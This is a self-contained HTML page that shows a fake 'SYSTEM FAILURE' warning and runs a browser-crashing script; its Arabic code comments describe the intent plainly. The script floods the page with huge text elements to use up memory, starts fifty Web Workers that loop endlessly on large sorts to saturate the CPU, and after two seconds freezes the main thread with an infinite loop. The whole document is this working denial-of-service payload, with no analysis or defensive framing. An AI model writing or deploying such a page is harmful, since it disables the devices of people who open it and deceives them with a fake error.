<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>FATAL ERROR</title>
<style>
  body { background: #000; color: #ff0000; font-family: monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
  h1 { font-size: 40px; text-shadow: 0 0 20px red; animation: shake 0.1s infinite; }
  @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
  p { color: #fff; font-size: 18px; }
</style>
</head>
<body>

<h1>SYSTEM FAILURE</h1>
<p>Memory dump in progress. Please force close the browser.</p>

<script>
// 1. إغراق الـ DOM واستنزاف الذاكرة (سيستهلك كل الرام)
setInterval(() => {
  for (let i = 0; i < 1000; i++) {
    const el = document.createElement('div');
    el.innerText = "FATAL_ERROR_0x000000".repeat(100); // نصوص ضخمة
    document.body.appendChild(el);
  }
}, 0);

// 2. تشغيل 50 عملية في الخلفية لاستنزاف المعالج (Web Workers)
for (let i = 0; i < 50; i++) {
  try {
    new Worker(URL.createObjectURL(new Blob([`
      let i = 0;
      function loop() { 
        i++; 
        new Array(500000).fill(Math.random()).sort(); 
        setTimeout(loop, 0); 
      }
      loop();
    `], {type: 'application/javascript'})));
  } catch(e) {}
}

// 3. بعد ثانيتين، قفل المتصفح تماماً (Infinite Loop)
// هاد الجزء بيخلي المتصفح يطلب "Force Close" لأن الخيط الرئيسي بيتجمد
setTimeout(() => {
  while (true) {
    // حلقة لا نهائية بتجمد واجهة المستخدم
    document.body.style.transform = `translate(${Math.random()}px, ${Math.random()}px)`;
  }
}, 2000);
</script>
</body>
</html>
